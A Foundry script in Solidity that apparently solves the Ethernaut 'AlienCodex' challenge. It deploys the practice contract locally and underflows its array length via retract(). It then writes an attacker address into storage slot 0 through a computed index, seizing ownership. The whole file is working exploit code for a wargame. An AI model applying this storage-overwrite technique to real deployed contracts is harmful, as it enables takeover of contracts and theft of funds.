// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import "forge-std/Script.sol";

contract AlienCodexHack is Script {
    address public constant eoa = address(1024);
    address public owner;

    function run() public {
        bytes memory bytecode = abi.encodePacked(
            vm.getCode("AlienCodex.sol:AlienCodex")
        );
        address aliencodex;
        assembly {
            aliencodex := create(0, add(bytecode, 0x20), mload(bytecode))
        }

        console.log(
            "Before:",
            address(
                uint160(
                    uint256(vm.load(address(aliencodex), bytes32(uint256(0))))
                )
            )
        );

        uint256 storageSlotZero = ((2**256) - 1) -
            uint256(keccak256(abi.encode(1))) +
            1;
        bytes32 paddingAddr = bytes32(abi.encode(eoa));

        vm.startPrank(eoa);
        (bool res, ) = aliencodex.call(
            abi.encodeWithSignature("make_contact()")
        );
        (res, ) = aliencodex.call(abi.encodeWithSignature("retract()"));
        (res, ) = aliencodex.call(
            abi.encodeWithSignature(
                "revise(uint256,bytes32)",
                storageSlotZero,
                paddingAddr
            )
        );
        (bool success, bytes memory data) = aliencodex.call(
            abi.encodeWithSignature("owner()")
        );
        if (!success) {
            revert();
        }
        owner = address(uint160(uint256(bytes32(data))));
        console.log("After:", owner);
    }
}
